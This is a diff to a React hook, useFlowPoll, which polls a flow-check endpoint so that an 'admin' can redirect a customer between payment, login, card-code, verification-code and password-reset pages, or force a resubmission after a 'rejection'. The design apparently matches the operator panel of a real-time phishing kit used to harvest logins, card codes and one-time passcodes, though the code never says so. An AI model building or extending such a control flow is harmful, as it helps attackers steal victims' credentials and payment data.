@@ -9,18 +9,32 @@ interface UseFlowPollOptions {
   reference: string;
   currentPage: string;
   enabled?: boolean;
+  onReset?: () => void;
 }
+
+// Maps the page the customer is currently on → the action name that means
+// "admin wants you to redo this same page" (i.e. your submission was rejected).
+const PAGE_TO_SELF_ACTION: Record<string, string> = {
+  payment: "redirect_payment",
+  login: "redirect_login",
+  "verify-login": "redirect_verify_login",
+  "card-code": "redirect_card_code",
+  register: "redirect_create_account",
+  "verification-code": "redirect_verification_code",
+  "forgot-password": "redirect_reset_password",
+};
 
 export function useFlowPoll({
   reference,
   currentPage,
   enabled = true,
+  onReset,
 }: UseFlowPollOptions) {
   const navigate = useNavigate();
 
   // Keep a ref with the latest values so the async poll closure never goes stale
-  const latestRef = useRef({ reference, currentPage, navigate });
-  latestRef.current = { reference, currentPage, navigate };
+  const latestRef = useRef({ reference, currentPage, navigate, onReset });
+  latestRef.current = { reference, currentPage, navigate, onReset };
 
   useEffect(() => {
     if (!enabled || !reference) return;
@@ -33,13 +47,27 @@ export function useFlowPoll({
       if (cancelled) return;
       if (Date.now() - startedAt > POLL_TIMEOUT_MS) return;
 
-      const { reference: ref, currentPage: page, navigate: nav } =
+      const { reference: ref, currentPage: page, navigate: nav, onReset: resetCb } =
         latestRef.current;
+
       try {
         const result = await paymentsApi.flowCheck(ref, page);
-        if (result.redirect && !cancelled) {
-          nav(result.redirect, { state: { reference: ref } });
-          return;
+
+        if (!cancelled) {
+          if (result.redirect) {
+            // Admin sent customer to a DIFFERENT page — navigate there.
+            nav(result.redirect, { state: { reference: ref } });
+            return; // stop this poller; the new page will start its own
+          }
+
+          if (result.action) {
+            const selfAction = PAGE_TO_SELF_ACTION[page];
+            if (selfAction && result.action === selfAction) {
+              // Admin sent customer back to THIS SAME page (rejection/retry).
+              resetCb?.();
+              // Keep polling so we can catch the NEXT admin action.
+            }
+          }
         }
       } catch {
         // network hiccup — keep polling
